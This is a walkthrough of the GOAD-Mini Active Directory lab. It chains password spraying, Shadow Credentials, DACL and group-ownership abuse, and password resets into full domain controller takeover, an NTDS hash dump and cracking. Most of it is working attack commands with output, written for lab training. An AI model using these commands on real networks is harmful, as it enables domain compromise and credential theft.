# GOAD-mini — Write-up (`sevenkingdoms.local`)

*Lab: GOAD-Mini (Orange Cyberdefense) — DC `KINGSLANDING` @ `192.168.56.10`. Single target on the subnet: the `sevenkingdoms.local` domain controller.*

---

## 1. Network discovery

```bash
nmap -sn 192.168.56.0/24
```
```
Nmap scan report for 192.168.56.1    # host (gateway/hypervisor)
Nmap scan report for 192.168.56.10   # KINGSLANDING (DC)
```

Full port scan on the DC:
```bash
rustscan -a 192.168.56.10 --ulimit 5000 -- -T4 -Pn -sC -sT -sV -oN rustscan.txt
```

---

## 2. Anonymous SMB / LDAP enumeration

```bash
enum4linux-ng -A -u "" -p "" kingslanding.sevenkingdoms.local
enum4linux-ng -A -u "guest" -p "" kingslanding.sevenkingdoms.local
```

Results:
1. Exposed services: LDAP, LDAPS, SMB (direct + over NetBIOS).
2. Anonymous (null session) SMB authentication works.
3. No shares accessible for `''` / `guest` with no password.

---

## 3. User enumeration (Kerberos)

Candidate username list (character names):
```
tywin.lannister, jaime.lannister, tyron.lannister, cersei.lannister,
robert.baratheon, joffrey.baratheon, renly.baratheon, stannis.baratheon,
petyer.baelish, lord.varys, maester.pycelle
```

Validation via Kerberos pre-auth (no authentication required):
```bash
kerbrute userenum --dc 192.168.56.10 -d sevenkingdoms.local users.txt
```
```
[+] VALID USERNAME:  lord.varys@sevenkingdoms.local
[+] VALID USERNAME:  petyer.baelish@sevenkingdoms.local
... (11 / 11 valid)
```
> All 11 accounts exist.

---

## 4. Password spraying

Naive wordlist generated from the names (first name + last name):
```bash
cat users.txt | awk -F '.' '{print $1}' >  pass.txt   # first names
cat users.txt | awk -F '.' '{print $2}' >> pass.txt   # last names
```

Spray over SMB:
```bash
nxc smb kingslanding.sevenkingdoms.local -u users.txt -p pass.txt --continue-on-success
```
```
[+] sevenkingdoms.local\jaime.lannister:cersei
```
> **Valid credentials: `jaime.lannister:cersei`**

---

## 5. Authenticated enumeration — `jaime.lannister`

```bash
bloodhound-python -u jaime.lannister -p cersei -d sevenkingdoms.local -ns 192.168.56.10 -c All --zip
```

Imported into BloodHound to map ACL abuse paths.

---

## 6. ACL exploitation chain

> The heart of this lab: a chain of ACL abuses leading from an unprivileged account to full control of the DC.
>
> `jaime` — GenericWrite → `joffrey` — WriteDacl → `tyron` — AddSelf → **Small Council** — AddMember → **Dragonstone** — WriteOwner → **Kingsguard** — GenericAll → `stannis` — (GenericAll on the computer) → **KINGSLANDING$ (DC)**

### 6.1 `jaime.lannister` → `GenericWrite` on `joffrey.baratheon`: Shadow Credentials

`GenericWrite` allows writing the target's `msDS-KeyCredentialLink` attribute → **Shadow Credentials** attack (`pywhisker`).

```bash
pywhisker -d sevenkingdoms.local --dc-ip 192.168.56.10 \
  -u jaime.lannister -p cersei --target joffrey.baratheon --action add
```
```
[+] Saved PFX (PKCS#12) certificate & key at path: RcXpWDOz.pfx
[i] PFX password: 6aWixNoDrKJwEB1WYB2k
```

Requesting a TGT via PKINIT with the generated certificate:
```bash
gettgtpkinit.py -cert-pfx RcXpWDOz.pfx -pfx-pass '6aWixNoDrKJwEB1WYB2k' \
  sevenkingdoms.local/joffrey.baratheon joffrey.ccache
```
```
AS-REP encryption key: 046f44b527fdbf8a95269b179f463bd20d8cb6e0bac2a953d6a0a4b7ce9e5fd5
Saved TGT to file
```
> Keep the **AS-REP encryption key** — needed for the UnPAC-the-hash step.

Testing the TGT:
```bash
export KRB5CCNAME=joffrey.ccache
nxc smb kingslanding.sevenkingdoms.local --use-kcache
```

Recovering Joffrey's NT hash (**UnPAC-the-hash**):
```bash
getnthash.py -key 046f44b527fdbf8a95269b179f463bd20d8cb6e0bac2a953d6a0a4b7ce9e5fd5 \
  sevenkingdoms.local/joffrey.baratheon
```
```
Recovered NT Hash: 3b60abbc25770511334b3829866b08f1
```

Offline cracking:
```bash
hashcat -m 1000 -a 0 joffrey.hash rockyou.txt
```
```
3b60abbc25770511334b3829866b08f1:1killerlion
```
> **`joffrey.baratheon:1killerlion`**

### 6.2 `joffrey.baratheon` → `WriteDacl` on `tyron.lannister`

`WriteDacl` allows rewriting the target's DACL. Granting ourselves `FullControl` (= `GenericAll`) on `tyron`:
```bash
dacledit.py -action write -rights FullControl \
  -principal joffrey.baratheon -target tyron.lannister \
  'sevenkingdoms.local/joffrey.baratheon:1killerlion'
```
```
[*] DACL backed up to dacledit-20261018-090336.bak
[*] DACL modified successfully!
```

With `FullControl`, two options:

**(a) Targeted Kerberoasting** (temporarily add an SPN to `tyron`):
```bash
targetedKerberoast.py -v -d sevenkingdoms.local -u joffrey.baratheon -p 1killerlion
```
```
[+] Printing hash for (tyron.lannister)
$krb5tgs$23$*tyron.lannister$SEVENKINGDOMS.LOCAL$...  [hash truncated]
```
> Hash recovered but **not crackable with rockyou.txt** — this path was abandoned.

**(b) Password reset** (more direct):
```bash
net rpc password tyron.lannister 'ir0nx' \
  -U 'sevenkingdoms.local/joffrey.baratheon%1killerlion' -S 192.168.56.10
nxc ldap sevenkingdoms.local -u tyron.lannister -p ir0nx
```
```
[+] sevenkingdoms.local\tyron.lannister:ir0nx
```
> **`tyron.lannister:ir0nx`** — `net rpc password` works here because `FullControl` includes the *Reset Password* right.

### 6.3 `tyron.lannister` → `AddSelf` on the `Small Council` group

`AddSelf` = Self-Membership: the right to add **only your own account** to `member`.
```bash
bloodyAD -u tyron.lannister -p ir0nx -d sevenkingdoms.local --host 192.168.56.10 \
  add groupMember "Small Council" tyron.lannister
```
```
[+] tyron.lannister added to Small Council
```

### 6.4 `Small Council` → `AddMember` on the `Dragonstone` group

Small Council members can add anyone to Dragonstone. `tyron` (now a member) adds himself:
```bash
bloodyAD -u tyron.lannister -p ir0nx -d sevenkingdoms.local --host 192.168.56.10 \
  add groupMember Dragonstone tyron.lannister
```
```
[+] tyron.lannister added to Dragonstone
```

### 6.5 `Dragonstone` → `WriteOwner` on the `Kingsguard` group

`WriteOwner` allows becoming the **owner** of Kingsguard:
```bash
bloodyAD -u tyron.lannister -p ir0nx -d sevenkingdoms.local --host 192.168.56.10 \
  set owner Kingsguard tyron.lannister
```
```
[+] Old owner S-1-5-21-... replaced by tyron.lannister on Kingsguard
```

> ⚠️ **Being the owner ≠ being a member.** Ownership grants the right to modify the group's DACL, not to inherit the group's rights. So: (1) grant yourself `FullControl` on the group, then (2) add yourself to it.

Verification — `tyron` is not yet a member:
```bash
bloodyAD ... get object Kingsguard --attr member
```
```
distinguishedName: CN=Kingsguard,OU=Crownlands,DC=sevenkingdoms,DC=local
# (no members)
```

(1) As owner, grant `FullControl` on the group:
```bash
dacledit.py -action write -rights FullControl \
  -principal tyron.lannister -target Kingsguard \
  -dc-ip 192.168.56.10 'sevenkingdoms.local/tyron.lannister:ir0nx'
```
```
[*] DACL modified successfully!
```

(2) Add ourselves to the group:
```bash
bloodyAD ... add groupMember Kingsguard tyron.lannister
```
```
[+] tyron.lannister added to Kingsguard
```

### 6.6 `Kingsguard` → `GenericAll` on `stannis.baratheon`

`tyron` is now in `Kingsguard`, which grants `GenericAll` on `stannis` — reset the password:
```bash
bloodyAD -u tyron.lannister -p ir0nx -d sevenkingdoms.local --host 192.168.56.10 \
  set password stannis.baratheon ir0nx
```
```
[+] Password changed successfully!
```
> **`stannis.baratheon:ir0nx`**

Quick confirmation of the new access:
```bash
netexec smb 192.168.56.10 -u stannis.baratheon -p ir0nx -x "net localgroup administrators stannis.baratheon /add"
```
```
[+] sevenkingdoms.local\stannis.baratheon:ir0nx
```

### 6.7 `stannis.baratheon` → `GenericAll` on the `KINGSLANDING$` computer object (the DC)

Why this is critical: `KINGSLANDING$` is the computer account of the **domain controller itself**. A DC account holds replication rights (*Replicating Directory Changes*), so controlling it = being able to DCSync the entire domain.
```bash
bloodyAD -u stannis.baratheon -p ir0nx -d sevenkingdoms.local --host 192.168.56.10 \
  set password 'KINGSLANDING$' ir0nx
```
```
[+] Password changed successfully!
```

---

## 7. NTDS dump & cracking

Replicating the NTDS database using the DC's own computer account:
```bash
nxc smb 192.168.56.10 -u 'KINGSLANDING$' -p ir0nx --ntds
```
```
Administrator:500:...:c66d72021a2d4744409969a581a1705e:::
krbtgt:502:...:50b8891edf54b3d6f183201c3f79028c:::
cersei.lannister:1113:...:c247f62516b53893c7addcf8c349954b:::
robert.baratheon:1115:...:9029cf007326107eb1c519c84ea60dbe:::
petyer.baelish:1119:...:6c439acfa121a821552568b086c8d210:::
[... 16 hashes dumped]
```
> At this point the domain is **already fully compromised**: we have the `Administrator` hash (→ Pass-the-Hash) and, critically, the `krbtgt` hash (→ **Golden Ticket**, domain-wide persistence).

Offline cracking:
```bash
hashcat --hash-type 1000 --attack-mode 0 KINGSLANDING.ntds rockyou.txt
```
```
e02bc503339d51f71d913c245d35b50b:vagrant
c247f62516b53893c7addcf8c349954b:il0vejaime
9029cf007326107eb1c519c84ea60dbe:iamthekingoftheworld
6c439acfa121a821552568b086c8d210:@littlefinger@
```

Plaintext credentials recovered:
```
cersei.lannister:il0vejaime
robert.baratheon:iamthekingoftheworld
petyer.baelish:@littlefinger@
```

Confirming a high-privilege account:
```bash
nxc smb 192.168.56.10 -u cersei.lannister -p il0vejaime
```
```
[+] sevenkingdoms.local\cersei.lannister:il0vejaime (admin)
```
> The `(admin)` flag shows `cersei` is a **local administrator on this machine**. Since this is the **DC**, that is equivalent to full domain compromise.

---
